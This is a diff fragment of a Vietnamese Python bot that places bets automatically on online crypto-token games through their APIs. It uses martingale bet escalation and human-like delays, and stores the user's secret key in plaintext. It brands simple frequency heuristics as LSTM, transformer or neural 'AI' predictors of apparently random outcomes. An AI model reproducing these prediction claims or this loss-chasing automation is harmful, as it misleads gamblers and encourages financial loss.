+                return s in ("đang", "dang", "pending", "wait", "chờ", "cho", "")
+
+            if kr is not None:
+                try:
+                    krid = int(kr)
+                except Exception:
+                    krid = kr
+                killed_room = krid
+                game_kill_log.append(krid)
+                update_killer_history(krid)
+                last_killed_room = krid
+                try:
+                    last_finished_issue = result_issue if result_issue is not None else issue_id
+                    last_finished_label = ROOM_NAMES.get(krid, f"Phòng {krid}")
+                except Exception:
+                    pass
+                last_killed_room_delayed = krid
+                for rid in ROOM_ORDER:
+                    if rid == krid:
+                        room_stats[rid]["kills"] += 1
+                        room_stats[rid]["last_kill_round"] = round_index
+                    else:
+                        room_stats[rid]["survives"] += 1
+
+                balance_before_payout = current_build
+
+                # Tìm lệnh cược còn "Đang" — khớp kỳ kết quả; fallback lệnh pending gần nhất
+                pending = [b for b in bet_history if _is_pending(b.get("result"))]
+                matched = [b for b in pending if _same_issue(b.get("issue"), result_issue)]
+                if not matched and pending:
+                    # issue_id đã nhảy kỳ mới → lấy pending mới nhất
+                    matched = [pending[-1]]
+
+                # Gán kết quả từng phòng; streak/martingale theo CẢ VÁN (1 lần)
+                round_lost = False
+                for rec in matched:
+                    try:
+                        placed_room = int(rec.get("room"))
+                        win = placed_room != int(krid)
+                        rec["result"] = "Thắng" if win else "Thua"
+                        rec["killed_room"] = krid
+                        if not win:
+                            round_lost = True
+                    except Exception:
+                        continue
+                if matched:
+                    if round_lost:
+                        lose_streak += 1
+                        win_streak = 0
+                        if lose_streak > max_lose_streak:
+                            max_lose_streak = lose_streak
+                        try:
+                            if current_bet is not None:
+                                current_bet = calculate_smart_bet(
+                                    base_bet, multiplier, lose_streak, current_build or 0
+                                )
+                        except Exception:
+                            current_bet = base_bet
+                        if pause_after_losses > 0:
+                            _skip_rounds_remaining = pause_after_losses
+                    else:
+                        win_streak += 1
+                        lose_streak = 0
+                        current_bet = base_bet
+                        if win_streak > max_win_streak:
+                            max_win_streak = win_streak
+                    for rec in matched:
+                        rec["win_streak"] = win_streak
+                        rec["lose_streak"] = lose_streak
+                        try:
+                            algo = rec.get("algo") or settings.get("algo", "ENSEMBLE")
+                            key = str(algo)
+                            AI_PERFORMANCE[key]["total"] += 1
+                            if rec.get("result") == "Thắng":
+                                AI_PERFORMANCE[key]["wins"] += 1
+                            else:
+                                AI_PERFORMANCE[key]["losses"] += 1
+                        except Exception:
+                            pass
+                        threading.Thread(
+                            target=_background_update_balance_after_result,
+                            args=(rec, balance_before_payout),
+                            daemon=True,
+                        ).start()
+            ui_state = "RESULT"
+            try:
+                if stop_when_profit_reached and profit_target is not None and isinstance(current_build, (int, float)) and current_build >= profit_target and not stop_flag:
+                    safe_console_print(f"[bold green]🎉 MỤC TIÊU LÃI ĐẠT: {current_build} >= {profit_target}. Dừng tool.[/]")
+                    stop_flag = True
+                    try:
+                        wsobj = _ws.get("ws")
+                        if wsobj:
+                            wsobj.close()
+                    except Exception:
+                        pass
+                if stop_when_loss_reached and stop_loss_target is not None and isinstance(current_build, (int, float)) and current_build <= stop_loss_target and not stop_flag:
+                    safe_console_print(f"[bold red]💀 CẮT LỖ: {current_build:,.2f} <= {stop_loss_target:,.2f}. Dừng tool.[/]")
+                    stop_flag = True
+                    try:
+                        wsobj = _ws.get("ws")
+                        if wsobj:
+                            wsobj.close()
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+def _background_update_balance_after_result(rec: dict, balance_before: Optional[float]):
+    global cumulative_profit
+    try:
+        time.sleep(2.5)
+        new_balance, _, _ = fetch_balances_3games(retries=2, timeout=5)
+        if rec and isinstance(new_balance, (int, float)):
+            if isinstance(balance_before, (int, float)):
+                delta = new_balance - balance_before
+                rec['delta'] = delta
+            else:
+                if rec.get('result') == 'Thắng':
+                    rec['delta'] = float(rec.get('amount', 0)) * 7
+                elif rec.get('result') == 'Thua':
+                    rec['delta'] = -float(rec.get('amount', 0))
+    except Exception:
+        pass
+
+def update_killer_history(killed_room_id):
+    if killed_room_id in room_state:
+        killer_history.append({'players': room_state[killed_room_id].get('players', 0), 'bet': room_state[killed_room_id].get('bet', 0)})
+
+def _process_room_update(room_data: dict):
+    if not isinstance(room_data, dict):
+        return
+    try:
+        rid = int(room_data.get("room_id") or room_data.get("roomId") or room_data.get("id"))
+        players = int(room_data.get("user_cnt") or room_data.get("userCount") or 0) or 0
+        bet = _parse_number(room_data.get("total_bet_amount") or room_data.get("totalBet") or room_data.get("bet") or 0) or 0
+        room_state[rid] = {"players": players, "bet": bet}
+        room_stats[rid]["last_players"] = players
+        room_stats[rid]["last_bet"] = bet
+    except (ValueError, TypeError):
+        pass
+
+def on_close(ws, code, reason):
+    global _ws_status
+    _ws_status = f"⏳ Đã đóng ({code})"
+
+def on_error(ws, err):
+    global _ws_status
+    _ws_status = f"❌ Lỗi: {str(err)[:30]}"
+
+def start_ws():
+    WS_URL = "wss://api.escapemaster.net/escape_master/ws"
+    backoff = 1.0
+    global _ws_status
+    while not stop_flag:
+        try:
+            _ws_status = "⏳ Đang kết nối..."
+            ws_app = websocket.WebSocketApp(WS_URL, on_open=on_open, on_message=on_message, on_close=on_close, on_error=on_error)
+            _ws["ws"] = ws_app
+            ws_app.run_forever(ping_interval=15, ping_timeout=6)
+        except Exception:
+            _ws_status = f"❌ Lỗi kết nối"
+        t = min(backoff + random.random() * 0.8, 30)
+        if not stop_flag:
+            time.sleep(t)
+            backoff = min(backoff * 1.8, 30)
+
+class BalancePoller(threading.Thread):
+    def __init__(self, uid: Optional[int], secret: Optional[str], poll_seconds: int = 2, on_balance=None, on_error=None, on_status=None):
+        super().__init__(daemon=True)
+        self.uid = uid
+        self.secret = secret
+        self.poll_seconds = max(1, int(poll_seconds))
+        self._running = True
+        self._last_balance_local: Optional[float] = None
+        self.on_balance = on_balance
+        self.on_error = on_error
+        self.on_status = on_status
+
+    def stop(self):
+        self._running = False
+
+    def run(self):
+        if self.on_status:
+            self.on_status("Kết nối...")
+        while self._running and not stop_flag:
+            try:
+                build, world, usdt = fetch_balances_3games(params={"userId": str(self.uid)} if self.uid else None, uid=self.uid, secret=self.secret)
+                if build is None:
+                    raise RuntimeError("Không đọc được balance từ response")
+                delta = 0.0 if self._last_balance_local is None else (build - self._last_balance_local)
+                first_time = (self._last_balance_local is None)
+                if first_time or abs(delta) > 0:
+                    self._last_balance_local = build
+                    if self.on_balance:
+                        self.on_balance(float(build), float(delta), {"ts": human_ts()})
+                    if self.on_status:
+                        self.on_status("Đang theo dõi")
+                else:
+                    if self.on_status:
+                        self.on_status("Đang theo dõi (không đổi)")
+            except Exception as e:
+                if self.on_error:
+                    self.on_error(str(e))
+                if self.on_status:
+                    self.on_status("Lỗi kết nối (thử lại...)")
+            for _ in range(max(1, int(self.poll_seconds * 5))):
+                if not self._running or stop_flag:
+                    break
+                time.sleep(0.2)
+        if self.on_status:
+            self.on_status("Đã dừng")
+
+def monitor_loop():
+    global last_balance_fetch_ts, last_msg_ts, stop_flag
+    while not stop_flag:
+        now = time.time()
+        if now - last_balance_fetch_ts >= BALANCE_POLL_INTERVAL:
+            last_balance_fetch_ts = now
+            try:
+                fetch_balances_3games(params={"userId": str(USER_ID)} if USER_ID else None)
+            except Exception:
+                pass
+        if now - last_msg_ts > 12:
+            try:
+                safe_send_enter_game(_ws.get("ws"))
+            except Exception:
+                pass
+        if now - last_msg_ts > 45:
+            try:
+                wsobj = _ws.get("ws")
+                if wsobj:
+                    try:
+                        wsobj.close()
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+        try:
+            already = False
+            if issue_id is not None:
+                try:
+                    already = (
+                        int(issue_id) in {int(x) for x in bet_sent_for_issue}
+                        or int(issue_id) in {int(x) for x in skipped_for_issue}
+                    )
+                except Exception:
+                    already = issue_id in bet_sent_for_issue or issue_id in skipped_for_issue
+            # Không mở khóa nếu đang SKIP / DANGER (theo setting)
+            if prediction_locked and issue_id is not None and not already:
+                if str(ui_state) == "SKIP":
+                    pass
+                elif analysis_start_ts and (time.time() - analysis_start_ts > max(float(analysis_duration or 45), 20) + 15):
+                    # chỉ mở nếu kẹt quá lâu thật sự
+                    prediction_locked = False
+            try:
+                cd = int(count_down) if count_down is not None else None
+            except Exception:
+                cd = None
+            ready = False
+            # Tôn trọng analysis_duration trong setting
+            if analysis_start_ts and (time.time() - analysis_start_ts >= float(analysis_duration or 45)):
+                ready = True
+            # Countdown gấp mới ép sớm (không phá setting 45s quá sớm)
+            if cd is not None and cd <= 8:
+                ready = True
+            if ready and issue_id is not None and not already and str(ui_state) != "SKIP":
+                if ui_state == "RESULT":
+                    ui_state = "ANALYZING"
+                lock_prediction_if_needed(force=False)
+        except Exception:
+            pass
+        time.sleep(0.6)
+        # ================== CDTD (CHẠY ĐUA TỐC ĐỘ) ==================
+
+cdtd_session = requests.Session()
+cdtd_headers = {}
+
+NV = {1: 'Bậc thầy tấn công', 2: 'Quyền sắt', 3: 'Thợ lặn sâu', 4: 'Cơn lốc sân cỏ', 5: 'Hiệp sĩ phi nhanh', 6: 'Vua home run'}
+NV_ICONS = {1: '🥋', 2: '👊', 3: '🤿', 4: '🌪️', 5: '🏇', 6: '⚾'}
+
+CDTD_ALGORITHMS = {
+    "RANDOM": "1. NGẪU NHIÊN",
+    "CHAIN_WIN": "2. CHUỖI THẮNG",
+    "CHAIN_LOSE": "3. CHUỖI THUA",
+    "HOT_TRACK": "4. BẮT SÓNG NÓNG",
+    "COLD_TRACK": "5. BẮT SÓNG LẠNH",
+    "BALANCE": "6. CÂN BẰNG",
+    "PATTERN_3": "7. MẪU 3 LẦN",
+    "PATTERN_5": "8. MẪU 5 LẦN",
+    "PROBABILITY": "9. XÁC SUẤT",
+    "FOLLOW_WIN": "10. THEO NGƯỜI THẮNG",
+    "AVOID_WIN": "11. TRÁNH NGƯỜI THẮNG",
+    "SMART": "12. THÔNG MINH",
+    "CYCLE_6": "13. CHU KỲ 6",
+    "CYCLE_12": "14. CHU KỲ 12",
+    "TREND_UP": "15. XU HƯỚNG TĂNG",
+    "TREND_DOWN": "16. XU HƯỚNG GIẢM",
+    "MARKOV": "17. MARKOV",
+    "BAYES": "18. BAYES",
+    "NEURAL": "19. NƠ-RON",
+    "GENETIC": "20. DI TRUYỀN",
+    "REINFORCE": "21. TĂNG CƯỜNG",
+    "KNN_3": "22. KNN 3",
+    "KNN_5": "23. KNN 5",
+    "DECISION": "24. CÂY QUYẾT ĐỊNH",
+    "FOREST": "25. RỪNG NGẪU NHIÊN",
+    "GRADIENT": "26. GRADIENT",
+    "ENSEMBLE": "27. TỔNG HỢP",
+    "TREND_FOLLOW": "28. THEO XU HƯỚNG",
+    "MEAN_REVERT": "29. ĐẢO CHIỀU",
+    "MOMENTUM": "30. ĐỘNG LƯỢNG",
+    "VOLATILITY": "31. BIẾN ĐỘNG",
+    "SEASONAL": "32. CHU KỲ MÙA",
+    "CORRELATION": "33. TƯƠNG QUAN",
+    "CLUSTER": "34. PHÂN CỤM",
+    "ANOMALY": "35. BẤT THƯỜNG",
+    "ENTROPY": "36. ENTROPY",
+    "FUZZY": "37. MỜ",
+    "LSTM": "38. LSTM",
+    "TRANSFORMER": "39. TRANSFORMER",
+    "ATTENTION": "40. ATTENTION",
+    "DEEP_Q": "41. DEEP Q",
+    "META": "42. META LEARNING",
+    "SAFE_RISK": "43. RỦI RO AN TOÀN (VIP)",
+}
+
+# KEY FREE CDTD: chỉ 10 AI
+CDTD_FREE_AI_LIST = [
+    "RANDOM", "CHAIN_WIN", "CHAIN_LOSE", "HOT_TRACK", "COLD_TRACK",
+    "BALANCE", "PATTERN_3", "PROBABILITY", "FOLLOW_WIN", "SMART",
+]
+
+
+def get_available_cdtd_ai_list(key_type: str = "free") -> List[str]:
+    """CDTD: FREE = 10 AI, VIP = full (gồm SAFE_RISK)."""
+    if key_type == "vip":
+        return list(CDTD_ALGORITHMS.keys())
+    return list(CDTD_FREE_AI_LIST)
+
+
+cdtd_settings = {"algo": "RANDOM"}
+cdtd_coin = "BUILD"
+cdtd_base_bet = 1.0
+cdtd_multiplier = 2.0
+cdtd_current_bet = 1.0
+cdtd_num_athletes = 1  # Số nhân vật đặt cược mỗi ván (1–5)
+cdtd_win_streak = 0
+cdtd_lose_streak = 0
+cdtd_max_win_streak = 0
+cdtd_max_lose_streak = 0
+cdtd_stats = {'win': 0, 'lose': 0, 'asset_0': 0}
+cdtd_bet_history = deque(maxlen=50)
+cdtd_stop_flag = False
+cdtd_issue_id = None
+cdtd_predicted_nv = None       # NV chính (tương thích UI cũ)
+cdtd_predicted_nvs = []        # Danh sách NV đã chọn (multi-bet)
+cdtd_round_warning = ""       # cảnh báo bỏ ván CDTD
+cdtd_ui_state = "WAITING"
+cdtd_analysis_start_ts = None
+cdtd_analysis_duration = 25.0
+cdtd_pause_rounds = 0
+cdtd_pause_remaining = 0
+cdtd_bet_rounds_before_skip = 0
+cdtd_rounds_placed = 0
+cdtd_skip_next = False
+cdtd_last_winner = None
+cdtd_previous_issue = None
+cdtd_bet_placed_this_round = False
+cdtd_checked_result = False
+
+def load_data_cdtd():
+    if os.path.exists('data-xw-cdtd.txt'):
+        try:
+            with open('data-xw-cdtd.txt', 'r', encoding='utf-8') as f:
+                data = json.load(f)
+                if data.get('user-id') and data.get('user-secret-key'):
+                    return data
+        except:
+            pass
+    
+    console.print(Rule(f"[bold {TST_COLORS['gold']}]📋 NHẬP THÔNG TIN CDTD[/]", style=TST_COLORS["gold"]))
+    console.print("1. Truy cập xworld.io\n2. Đăng nhập\n3. Vào Chạy đua tốc độ\n4. Copy link\n")
+    link = Prompt.ask(f'[bold {TST_COLORS["gold"]}]📋 Nhập link[/]')
+    
+    try:
+        user_id = link.split('&')[0].split('?userId=')[1]
+        user_secretkey = link.split('&')[1].split('secretKey=')[1]
+    except:
+        user_id = Prompt.ask(f'[bold {TST_COLORS["gold"]}]👤 User ID[/]')
+        user_secretkey = Prompt.ask(f'[bold {TST_COLORS["gold"]}]🔑 Secret Key[/]')
+    
+    json_data = {'user-id': user_id, 'user-secret-key': user_secretkey}
+    with open('data-xw-cdtd.txt', 'w+', encoding='utf-8') as f:
+        json.dump(json_data, f, indent=4, ensure_ascii=False)
+    return json_data
+
+def setup_cdtd_headers(data: dict):
+    global cdtd_headers
+    cdtd_headers = {
+        'accept': '*/*',
+        'accept-language': 'vi,en;q=0.9',
+        'country-code': 'vn',
+        'origin': 'https://xworld.info',
+        'referer': 'https://xworld.info/',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'user-id': data['user-id'],
+        'user-login': 'login_v2',
+        'user-secret-key': data['user-secret-key'],
+        'xb-language': 'vi-VN'
+    }
+
+def top_100_cdtd():
+    try:
+        response = cdtd_session.get(
+            'https://api.sprintrun.win/sprint/recent_100_issues',
+            headers={'accept': '*/*', 'origin': 'https://sprintrun.win', 'referer': 'https://sprintrun.win/', 'user-agent': 'Mozilla/5.0'},
+            timeout=10
+        )
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('code') == 0 and 'data' in data:
+                win_times = data['data'].get('athlete_2_win_times', {})
+                return [1, 2, 3, 4, 5, 6], [win_times.get(str(i), 0) for i in range(1, 7)]
+    except Exception as e:
+        safe_console_print(f"[yellow]⚠️ Lỗi top_100: {e}[/yellow]")
+    return [1, 2, 3, 4, 5, 6], [0, 0, 0, 0, 0, 0]
+
+def top_10_cdtd():
+    try:
+        response = cdtd_session.get(
+            'https://api.sprintrun.win/sprint/recent_10_issues',
+            headers=cdtd_headers,
+            timeout=10
+        )
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('code') == 0 and 'data' in data:
+                recent = data['data'].get('recent_10', [])
+                issues = [i['issue_id'] for i in recent]
+                results = [i['result'][0] if i.get('result') else 1 for i in recent]
+                return issues, results
+    except Exception as e:
+        safe_console_print(f"[yellow]⚠️ Lỗi top_10: {e}[/yellow]")
+    return [0], [1]
+
+def user_asset_cdtd():
+    try:
+        response = cdtd_session.post(
+            'https://wallet.3games.io/api/wallet/user_asset',
+            headers=cdtd_headers,
+            json={'user_id': int(cdtd_headers.get('user-id', 0)), 'source': 'home'},
+            timeout=10
+        )
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('code') == 0 and 'data' in data:
+                user_asset = data['data'].get('user_asset', {})
+                return {
+                    'USDT': float(user_asset.get('USDT', 0)),
+                    'WORLD': float(user_asset.get('WORLD', 0)),
+                    'BUILD': float(user_asset.get('BUILD', 0))
+                }
+    except Exception as e:
+        safe_console_print(f"[yellow]⚠️ Lỗi user_asset: {e}[/yellow]")
+    return {'USDT': 0, 'WORLD': 0, 'BUILD': 0}
+
+def bet_cdtd(issue_id, nv_id, amount):
+    try:
+        human_bet_delay(f"NV{nv_id} · kỳ {issue_id}")
+        response = cdtd_session.post(
+            'https://api.sprintrun.win/sprint/bet',
+            headers=cdtd_headers,
+            json={
+                'issue_id': int(issue_id),
+                'bet_group': 'not_winner',
+                'asset_type': cdtd_coin,
+                'athlete_id': nv_id,
+                'bet_amount': float(amount)
+            },
+            timeout=10
+        )
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('code') == 0:
+                return True, "ok"
+            else:
+                return False, data.get('msg', 'Unknown error')
+        else:
+            return False, f"HTTP {response.status_code}"
+    except Exception as e:
+        return False, str(e)
+
+def build_cdtd_telegram_message(issue_id, killed_nv, bet_nv, bet_amount, result, pnl_van, total_pnl, balance_start, balance_end, win_count, lose_count, max_win_streak, max_lose_streak):
+    total_games = win_count + lose_count
+    win_rate = (win_count / total_games * 100) if total_games > 0 else 0
+    result_emoji = "🟢" if result == 'win' else "🔴"
+    killed_name = NV.get(killed_nv, f"NV{killed_nv}")
+    bet_name = NV.get(bet_nv, f"NV{bet_nv}")
+    bal_start = f"{balance_start:,.2f}" if balance_start >= 1000 else f"{balance_start:.4f}"
+    bal_end = f"{balance_end:,.2f}" if balance_end >= 1000 else f"{balance_end:.4f}"
+    message = f"""{result_emoji} <b>Ván #{issue_id}</b> | {NV_ICONS.get(killed_nv, '🏆')} <b>{killed_name}</b> thắng
+┣ 🤖 Bot chọn: <b>{bet_name}</b>
+┣ 💰 Cược: <b>{bet_amount:,.0f} {cdtd_coin}</b>
+┣ 💵 Lãi: <b>{pnl_van:+,.4f}</b> | Tổng: <b>{total_pnl:+,.2f}</b>
+┣ 📊 {win_count}W/{lose_count}L ({win_rate:.0f}%) | {bal_start} → {bal_end}
+┗ 🔥 Max: 🟢{max_win_streak} 🔴{max_lose_streak} | 🕐 {datetime.now(tz).strftime('%H:%M %d/%m')}"""
+    return message
+
+# ================== CDTD AI FUNCTIONS ==================
+
+def _cdtd_recent(data_top10) -> List[int]:
+    """Chuỗi NV thắng gần đây (int 1–6)."""
+    out = []
+    if data_top10 and len(data_top10) > 1 and data_top10[1]:
+        for x in data_top10[1]:
+            try:
+                n = int(x)
+                if 1 <= n <= 6:
+                    out.append(n)
+            except Exception:
+                continue
+    return out
+
+
+def _cdtd_wins100(data_top100) -> List[int]:
+    wins = [0] * 6
+    if data_top100 and len(data_top100) > 1 and data_top100[1]:
+        try:
+            raw = list(data_top100[1])[:6]
+            for i, w in enumerate(raw):
+                wins[i] = int(w or 0)
+        except Exception:
+            pass
+    return wins
+
+
+def _cdtd_softmax(scores: Dict[int, float], temperature: float = 1.0) -> Dict[int, float]:
+    if not scores:
+        return {i: 1 / 6 for i in range(1, 7)}
+    t = max(0.05, float(temperature))
+    m = max(scores.values())
+    exps = {k: math.exp((v - m) / t) for k, v in scores.items()}
+    s = sum(exps.values()) or 1.0
+    return {k: v / s for k, v in exps.items()}
+
+
+def _cdtd_weighted_pick(scores: Dict[int, float], temperature: float = 0.85) -> int:
+    probs = _cdtd_softmax(scores, temperature)
+    keys = list(probs.keys())
+    weights = [max(1e-9, probs[k]) for k in keys]
+    return int(random.choices(keys, weights=weights, k=1)[0])
+
+
+def _cdtd_transition_matrix(recent: List[int]) -> Dict[int, Dict[int, float]]:
+    """P(next|current) với Laplace smoothing."""
+    trans = {i: Counter() for i in range(1, 7)}
+    for a, b in zip(recent, recent[1:]):
+        trans[a][b] += 1
+    probs = {}
+    for i in range(1, 7):
+        total = sum(trans[i].values()) + 6 * 0.5
+        probs[i] = {j: (trans[i].get(j, 0) + 0.5) / total for j in range(1, 7)}
+    return probs
+
+
+def _cdtd_ewma_form(recent: List[int], alpha: float = 0.35) -> Dict[int, float]:
+    """Form gần đây — trọng số giảm dần theo thời gian."""
+    form = {i: 0.0 for i in range(1, 7)}
+    if not recent:
+        return form
+    w = 1.0
+    total_w = 0.0
+    for nv in reversed(recent):
+        form[nv] += w
+        total_w += w
+        w *= (1.0 - alpha)
+    if total_w > 0:
+        for i in range(1, 7):
+            form[i] /= total_w
+    return form
+
+
+def _cdtd_base_scores(data_top10, data_top100) -> Dict[int, float]:
+    """Điểm nền kết hợp win100 + form EWMA + anti-streak."""
+    wins = _cdtd_wins100(data_top100)
+    total = sum(wins) or 1
+    recent = _cdtd_recent(data_top10)
+    form = _cdtd_ewma_form(recent)
+    scores = {}
+    for i in range(1, 7):
+        long = wins[i - 1] / total
+        short = form.get(i, 0.0)
+        scores[i] = 0.38 * long + 0.42 * short + 0.20 * (1.0 - short)  # mean-revert nhẹ
+    return scores
+
+
+def cdtd_execute_ai(mode: str, data_top10, data_top100) -> int:
+    """
+    CDTD AI v2 — logic đầy đủ cho 42 engine.
+    Dùng top10 (form ngắn) + top100 (form dài) + Markov / Bayes / ensemble có trọng số.
+    """
+    global _key_type
+    mode = (mode or "RANDOM").upper()
+    allowed = get_available_cdtd_ai_list(_key_type)
+    if mode not in allowed:
+        mode = "RANDOM"
+
+    candidates = list(range(1, 7))
+    recent = _cdtd_recent(data_top10)
+    wins = _cdtd_wins100(data_top100)
+    total100 = sum(wins) or 1
+    base = _cdtd_base_scores(data_top10, data_top100)
+
+    def pick_max(sc: Dict[int, float]) -> int:
+        if not sc:
+            return random.choice(candidates)
+        best = max(sc.values())
+        tops = [k for k, v in sc.items() if abs(v - best) < 1e-9]
+        return random.choice(tops)
+
+    def pick_min(sc: Dict[int, float]) -> int:
+        if not sc:
+            return random.choice(candidates)
+        worst = min(sc.values())
+        lows = [k for k, v in sc.items() if abs(v - worst) < 1e-9]
+        return random.choice(lows)
+
+    # ---------- core modes ----------
+    if mode == "RANDOM":
+        return random.choice(candidates)
+
+    if mode == "CHAIN_WIN":
+        mx = max(wins)
+        return random.choice([i + 1 for i, w in enumerate(wins) if w == mx])
+
+    if mode == "CHAIN_LOSE":
+        mn = min(wins)
+        return random.choice([i + 1 for i, w in enumerate(wins) if w == mn])
+
+    if mode == "HOT_TRACK":
+        window = recent[-5:] if len(recent) >= 5 else recent
+        if not window:
+            return pick_max(base)
+        c = Counter(window)
+        mx = max(c.values())
+        return random.choice([k for k, v in c.items() if v == mx])
+
+    if mode == "COLD_TRACK":
+        window = recent[-5:] if len(recent) >= 5 else recent
+        c = Counter(window) if window else Counter()
+        # số chưa xuất hiện = lạnh nhất
+        cold_scores = {i: -c.get(i, 0) for i in candidates}
+        return pick_max(cold_scores)
+
+    if mode == "BALANCE":
+        avg = total100 / 6.0
+        balanced = [i + 1 for i, w in enumerate(wins) if abs(w - avg) <= max(1.0, avg * 0.15)]
+        return random.choice(balanced) if balanced else pick_max(base)
+
+    if mode == "PATTERN_3":
+        if len(recent) >= 3 and recent[-3] == recent[-1]:
+            return recent[-2]
+        return pick_max(base)
+
+    if mode == "PATTERN_5":
+        if len(recent) >= 5:
+            for i in range(len(recent) - 2, 0, -1):
+                if recent[i - 1] == recent[i + 1]:
+                    return recent[i]
+        return pick_max(base)
+
+    if mode == "PROBABILITY":
+        weights = [max(0.01, w / total100) for w in wins]
+        return int(random.choices(candidates, weights=weights, k=1)[0])
+
+    if mode == "FOLLOW_WIN":
+        return recent[-1] if recent else random.choice(candidates)
+
+    if mode == "AVOID_WIN":
+        if recent:
+            filt = [c for c in candidates if c != recent[-1]]
+            return random.choice(filt) if filt else random.choice(candidates)
+        return random.choice(candidates)
+
+    if mode == "SMART":
+        sc = dict(base)
+        # bonus risk thấp (form tốt + không streak)
+        for i in candidates:
+            sc[i] += 0.08 * (wins[i - 1] / total100)
+        if recent:
+            sc[recent[-1]] -= 0.12
+        return _cdtd_weighted_pick(sc, 0.7)
+
+    if mode == "CYCLE_6":
+        if len(recent) >= 6:
+            # dự đoán theo chu kỳ 6: lặp pattern gần nhất
+            return recent[-6]
+        if recent:
+            return candidates[(recent[-1]) % 6]
+        return random.choice(candidates)
+
+    if mode == "CYCLE_12":
+        if len(recent) >= 12:
+            return recent[-12]
+        return cdtd_execute_ai("CYCLE_6", data_top10, data_top100)
+
+    if mode == "TREND_UP":
+        # NV đang tăng tần suất nửa sau vs nửa trước
+        if len(recent) < 6:
+            return pick_max(base)
+        mid = len(recent) // 2
+        c1, c2 = Counter(recent[:mid]), Counter(recent[mid:])
+        sc = {i: c2.get(i, 0) - c1.get(i, 0) + 0.1 * (wins[i - 1] / total100) for i in candidates}
+        return pick_max(sc)
+
+    if mode == "TREND_DOWN":
+        if len(recent) < 6:
+            return pick_min(base)
+        mid = len(recent) // 2
+        c1, c2 = Counter(recent[:mid]), Counter(recent[mid:])
+        sc = {i: c1.get(i, 0) - c2.get(i, 0) for i in candidates}
+        return pick_max(sc)
+
+    if mode == "MARKOV":
+        if len(recent) < 3:
+            return pick_max(base)
+        tm = _cdtd_transition_matrix(recent)
+        last = recent[-1]
+        return pick_max(tm.get(last, {i: 1 / 6 for i in candidates}))
+
+    if mode == "BAYES":
+        # posterior ∝ prior(uniform) * likelihood(form)
+        prior = 1 / 6
+        like = {i: (wins[i - 1] + 1) / (total100 + 6) for i in candidates}
+        if recent:
+            form = _cdtd_ewma_form(recent)
+            for i in candidates:
+                like[i] *= 0.5 + form.get(i, 0)
+        post = {i: prior * like[i] for i in candidates}
+        s = sum(post.values()) or 1
+        post = {i: v / s for i, v in post.items()}
+        return _cdtd_weighted_pick(post, 0.6)
+
+    if mode == "NEURAL":
+        # MLP giả lập 1 hidden layer trên feature [long, short, last_onehot, gap]
+        form = _cdtd_ewma_form(recent)
+        last = recent[-1] if recent else 0
+        sc = {}
+        for i in candidates:
+            x1 = wins[i - 1] / total100
+            x2 = form.get(i, 0.0)
+            x3 = 1.0 if i == last else 0.0
+            gap = 0
+            if recent:
+                try:
+                    gap = (len(recent) - 1 - recent[::-1].index(i)) / max(1, len(recent))
+                except ValueError:
+                    gap = 1.0
+            h = 0.55 * x1 + 0.70 * x2 - 0.35 * x3 + 0.25 * gap
+            sc[i] = 1 / (1 + math.exp(-3.0 * (h - 0.35)))
+        return _cdtd_weighted_pick(sc, 0.65)
+
+    if mode == "GENETIC":
+        # fitness = survival proxy = win rate + diversity bonus
+        sc = {i: (wins[i - 1] + 1) / (total100 + 6) for i in candidates}
+        if recent:
+            c = Counter(recent[-8:])
+            for i in candidates:
+                sc[i] += 0.05 * (1.0 - c.get(i, 0) / 8.0)
+        return pick_max(sc)
+
+    if mode == "REINFORCE":
+        # reward theo lịch sử cược session (nếu có) + form
+        sc = dict(base)
+        try:
+            for b in list(cdtd_bet_history)[-12:]:
+                nv = b.get("chosen")
+                res = b.get("result")
+                if nv in sc and res == "win":
+                    sc[nv] += 0.15
+                elif nv in sc and res == "lose":
+                    sc[nv] -= 0.10
+        except Exception:
+            pass
+        return pick_max(sc)
+
+    if mode in ("KNN_3", "KNN_5"):
+        k = 3 if mode == "KNN_3" else 5
+        window = recent[-k:] if recent else []
+        if not window:
+            return random.choice(candidates)
+        c = Counter(window)
+        # KNN cold trong cửa sổ
+        return pick_min({i: float(c.get(i, 0)) for i in candidates}) if mode == "KNN_3" else pick_max({i: float(c.get(i, 0)) for i in candidates})
+
+    if mode == "DECISION":
+        if not recent:
+            return pick_max(base)
+        last = recent[-1]
+        # rule: nếu last hot trong top100 → tránh; ngược lại follow form
+        if wins[last - 1] >= max(wins) * 0.9:
+            filt = [i for i in candidates if i != last]
+            sc = {i: base[i] for i in filt}
+            return pick_max(sc)
+        return pick_max(base)
+
+    if mode == "FOREST":
+        votes = Counter()
+        for m in ("HOT_TRACK", "COLD_TRACK", "SMART", "MARKOV", "BAYES", "MEAN_REVERT"):
+            try:
+                votes[cdtd_execute_ai(m, data_top10, data_top100)] += 1
+            except Exception:
+                continue
+        return votes.most_common(1)[0][0] if votes else pick_max(base)
+
+    if mode == "GRADIENT":
+        sc = dict(base)
+        # residual boost: NV under-performing recent vs long
+        form = _cdtd_ewma_form(recent)
+        for i in candidates:
+            residual = (wins[i - 1] / total100) - form.get(i, 0)
+            sc[i] += 0.2 * residual  # mean reversion nhẹ
+        return pick_max(sc)
+
+    if mode == "TREND_FOLLOW":
+        return cdtd_execute_ai("TREND_UP", data_top10, data_top100)
+
+    if mode == "MEAN_REVERT":
+        # chọn NV lạnh so với kỳ vọng dài hạn
+        form = _cdtd_ewma_form(recent)
+        sc = {i: (wins[i - 1] / total100) - form.get(i, 0) for i in candidates}
+        return pick_max(sc)
+
+    if mode == "MOMENTUM":
+        if len(recent) < 4:
+            return pick_max(base)
+        sc = Counter(recent[-4:])
+        return pick_max({i: float(sc.get(i, 0)) for i in candidates})
+
+    if mode == "VOLATILITY":
+        # NV có tần suất ổn định (ít biến động xuất hiện)
+        if len(recent) < 8:
+            return pick_max(base)
+        mid = len(recent) // 2
+        c1, c2 = Counter(recent[:mid]), Counter(recent[mid:])
+        sc = {i: -abs(c1.get(i, 0) - c2.get(i, 0)) + 0.5 * (wins[i - 1] / total100) for i in candidates}
+        return pick_max(sc)
+
+    if mode == "SEASONAL":
+        # theo vị trí trong chu kỳ 6
+        if not recent:
+            return random.choice(candidates)
+        phase = len(recent) % 6
